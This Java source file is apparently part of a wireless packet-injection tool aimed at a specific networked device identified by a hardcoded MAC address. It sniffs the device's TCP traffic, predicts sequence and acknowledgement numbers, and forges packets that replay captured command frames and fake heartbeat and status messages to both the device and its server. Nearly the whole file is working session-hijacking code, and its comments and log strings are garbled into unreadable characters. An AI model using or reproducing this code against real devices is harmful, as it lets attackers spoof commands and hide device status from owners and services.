package Manager.Listenner;

import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.BlockingQueue;

import Model.ConterData;
import Model.Model_a;
import Util.DealPcap.wireless802_airdump1;
import Util.SetPacket.SetTCP;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;

public class Counter_kerui implements PackageListenner {

	private Packet packet;
	private String hostMAC = "ac:cf:23:87:bd:2e"; 
	private String dataType = "TCP";
	private ConterData conterData = new ConterData();
	BlockingQueue<Packet> sendQueue;
	
	
	//��־λ
	private int flag = 0;
	
	{
		
		readProperties();
		
	}
	
	public static void main(String[] args){
		
		//new Counter_kerui();
	}
	
	
	public Counter_kerui(BlockingQueue<Packet> sendQueue){
		
		this.sendQueue = sendQueue;
				
	}
	
	public Counter_kerui(){
		
		
				
	}

	
	@Override
	public void listenPackage(String  yourMAC,String hostMAC,Packet Packet,String routeMAC,String host_ip) {
		
		
		if(this.hostMAC.equals(hostMAC)){
			
			if(Packet instanceof TCPPacket){
				
				TCPPacket tcpPacket =(TCPPacket)Packet;
				
				   SetTCP st = new SetTCP();
				   TCPPacket tcp = null;
				   //int total = counter_data_list.size();
				   
				 
				   //����Ҫα���������α��Ϊ����������������
				   //�ȼ����seq ack
				   
				   long seq = 0;
				   long ack = 0;
				   
				   if(tcpPacket.syn){
					   
					   //SYN����֡
					   
				   }
				   else if(tcpPacket.ack && !tcpPacket.psh){

						   seq = tcpPacket.ack_num;
						   ack = tcpPacket.sequence;       
						   
				   }
				   else if(tcpPacket.ack && tcpPacket.psh){
					   
					   
					   //����SEQ��ACK
					   seq = tcpPacket.ack_num;
					   ack = tcpPacket.sequence + tcpPacket.data.length;	  
				 }   
				   
				   
				   //����������������
				   if(tcpPacket.src_ip.getHostAddress().equals(host_ip)){
					   
					   if(seq != 0){
						   
						   //int index = step;
						   if(conterData.getCounter_data_list().size()>0){
							   
							   System.out.println("α�췢���豸������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, hostMAC, conterData.getCounter_data_list().get(0));
							   //
							   conterData.getCounter_data_list().remove(0);
							   
							   //
							   flag=1;
				System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
							    
						   }
						   else {	   
							   //��������ɷ��ƶ��е����ݺ���������ظ��������ݣ��ż���α��ACK�ظ������򲻻ظ�
							   if(tcpPacket.data.length != 0){ 
								   if(conterData.getCounter_heart_list_toHost().size() != 0&&tcpPacket.data.length==305){
									   System.out.println("α�췢���豸������������.....");
									   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
								    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
								    			 yourMAC, hostMAC, null);
						System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 
									   
								flag=2;
								   }
								   else if(conterData.getCounter_heart_list_toHost().size() != 0&&tcpPacket.data.length>0){
									   System.out.println("α�췢���豸������������.....");
									   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
								    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
								    			 yourMAC, hostMAC, conterData.getCounter_heart_list_toHost().get(0));
									  
						System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length); 
								   }else{
									   System.out.println("α�췢���豸������������.....");
									   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
								    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
								    			 yourMAC, hostMAC, null);
						System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack); 		   
								   }
								   
							   }   
						   }
						  	   
					   }   
				   }
				   
				   //����������������
				   else if(tcpPacket.dst_ip.getHostAddress().equals(host_ip)){
					  
					   		if((tcpPacket.data.length == 67 || tcpPacket.data.length == 231)&& conterData.getFake_status_list_toService().size()!=0){
					   			
					   		 System.out.println("α��״̬���ݷ�����������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, routeMAC, conterData.getFake_status_list_toService().get(0));
							   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
					   		}
					   		
					   		else if(conterData.getCounter_heart_list_toService().size() != 0 && tcpPacket.data.length >0){
					   			
							   System.out.println("α�췢����������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, routeMAC, conterData.getCounter_heart_list_toService().get(0));
							   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+"  frameLen|"+tcp.data.length);
							   
						   }else {
							   
							   System.out.println("α�췢����������������.....");
							   tcp =  st.fakePacket(tcpPacket.dst_port, tcpPacket.src_port, 
						    			 seq, ack, tcpPacket.dst_ip.getHostAddress(), tcpPacket.src_ip.getHostAddress(),
						    			 yourMAC, routeMAC, null);
							   System.out.println("α�����ݳɹ�   seq|"+tcp.sequence+" ack|"+tcp.ack_num+" ack|"+tcp.ack);
						}
				   }
				 
				   
				   if(tcp != null){
					   
					   this.packet = tcp;
					   
					   try {
						sendQueue.put(tcp);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				   }
				
			}
		}
		
		
	}

		@Override
		public Packet instance() {
			
			return this.packet;
		}
		
	/*************************************************
	 * ��ȡ�����ļ�prameter.properties
	 *************************************************/
	  public void readProperties(){
		  
		    wireless802_airdump1 w = new wireless802_airdump1();
		  
		  
			Properties prop = new Properties();
			
			InputStream in = Object. class .getResourceAsStream( "/counterProperties_kerui.properties" );   
			
			
	        try  {    
	           prop.load(in);    
	           
	           String COUNTER_DATASOURCE =  prop.getProperty( "COUNTER_DATASOURCE" ).trim();
	           
	           
	           int[] INT_INDEX = null;
	           String[] ss1  =  prop.getProperty( "INT_INDEX" ).trim().split(",");
	           if(ss1.length != 0){ 
	        	   INT_INDEX = new int[ss1.length];
	        	   for(int i = 0;i<ss1.length;i++){  
		        	   INT_INDEX[i] = Integer.parseInt(ss1[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_UP= null;
	           String[] ss2 =  prop.getProperty( "HEART_INDEX_UP" ).trim().split(",");
	           if(!ss2[0].equals("")){ 
	        	   HEART_INDEX_UP = new int[ss2.length];
	        	   for(int i = 0;i<ss2.length;i++){  
	        		   HEART_INDEX_UP[i] = Integer.parseInt(ss2[i]);
		           } 
	           }
	           
	           
	           int[] HEART_INDEX_DOWN = null;
	           String[] ss3 =  prop.getProperty( "HEART_INDEX_DOWN" ).trim().split(",");
	           if(!ss3[0].equals("")){ 
	        	   HEART_INDEX_DOWN = new int[ss3.length];
	        	   for(int i = 0;i<ss3.length;i++){  
	        		   HEART_INDEX_DOWN[i] = Integer.parseInt(ss3[i]);
		           } 
	           }
	           
	           int[] STATUS_INDEX_TOSERVICE = null;
	           String[] ss4 =  prop.getProperty( "STATUS_INDEX_TOSERVICE" ).trim().split(",");
	           if(!ss4[0].equals("")){ 
	        	   STATUS_INDEX_TOSERVICE = new int[ss4.length];
	        	   for(int i = 0;i<ss4.length;i++){  
	        		   STATUS_INDEX_TOSERVICE[i] = Integer.parseInt(ss4[i]);
		           } 
	           }
	           
	           
	           
	         //����Ҫʶ��һ����������·������������������ݣ�����������������ͨ��
				
				List<Model_a> ls = w.ergodic(COUNTER_DATASOURCE);
				List<Model_a> counter_data_list = w.getFrameByindex(INT_INDEX,ls);
				
				if(counter_data_list.size() != 0){
					System.out.println("�����ɹ������ɷ������ݶ���........");
					System.out.println("length:"+counter_data_list.size());
					conterData.setCounter_data_list(counter_data_list);
				}else {
					System.out.println("���ƶ��л�ȡʧ��");
				}
				
				if(HEART_INDEX_UP !=null && HEART_INDEX_UP.length != 0 ){
					List<Model_a> counter_heart_list_toService = w.getFrameByindex(HEART_INDEX_UP, ls);	
					if(counter_heart_list_toService.size() != 0){
						System.out.println("�����ɹ�������α����������toService........");
						System.out.println("length:"+counter_heart_list_toService.size());
						conterData.setCounter_heart_list_toService(counter_heart_list_toService);
					}
				}else {
					System.out.println("δ������������ģʽ����������toServiceδ����");
				}
				
				if(HEART_INDEX_DOWN !=null && HEART_INDEX_DOWN.length != 0 ){
					List<Model_a> counter_heart_list_toHost = w.getFrameByindex(HEART_INDEX_DOWN, ls);	
					if(counter_heart_list_toHost.size() != 0){
						System.out.println("�����ɹ�������α����������toHost........");
						System.out.println("length:"+counter_heart_list_toHost.size());
						conterData.setCounter_heart_list_toHost(counter_heart_list_toHost);
					}
				}else {
					System.out.println("δ������������ģʽ����������toHostδ����");
				}
				
				
				if( STATUS_INDEX_TOSERVICE != null && STATUS_INDEX_TOSERVICE.length != 0){
					List<Model_a> fake_status_list_toService = w.getFrameByindex(STATUS_INDEX_TOSERVICE, ls);	
					if(fake_status_list_toService.size() != 0){
						System.out.println("�����ɹ�������α��״̬����toService........");
						System.out.println("length:"+fake_status_list_toService.size());
						conterData.setFake_status_list_toService(fake_status_list_toService);
					}
				}
	           
	       }  catch  (IOException e) {    
	           e.printStackTrace();    
	       }  
	         
	  }
	  /*************************************************
	 * end
	 *************************************************/


	public BlockingQueue<Packet> getSendQueue() {
		return sendQueue;
	}


	public void setSendQueue(BlockingQueue<Packet> sendQueue) {
		this.sendQueue = sendQueue;
	}


	@Override
	public int successFlag() {
		// TODO Auto-generated method stub
		return this.flag;
	}

}
